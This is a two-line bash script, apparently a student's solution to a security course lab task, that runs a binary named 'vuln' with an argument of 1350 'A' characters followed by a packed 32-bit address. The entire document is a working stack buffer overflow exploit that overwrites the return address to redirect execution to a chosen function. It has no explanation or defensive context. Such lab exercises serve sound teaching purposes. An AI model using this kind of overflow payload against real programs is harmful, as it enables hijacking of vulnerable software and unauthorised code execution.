#!/usr/bin/env bash
/task2/s1803764/vuln "$(python -c "print('A'*1350 + '\x56\x85\x04\x08')")"